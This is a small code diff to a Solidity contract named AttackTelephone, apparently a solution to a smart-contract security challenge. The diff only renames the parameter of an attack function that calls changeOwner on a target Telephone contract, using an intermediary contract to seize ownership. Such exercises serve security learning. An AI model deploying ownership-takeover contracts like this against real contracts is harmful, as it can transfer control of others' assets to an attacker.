@@ -13,7 +13,7 @@ contract AttackTelephone {
         tel = Telephone(_tel);
     }
     
-    function attack(address _owner) public {
-        tel.changeOwner(_owner);
+    function attack(address _newOwner) public {
+        tel.changeOwner(_newOwner);
     }
 }
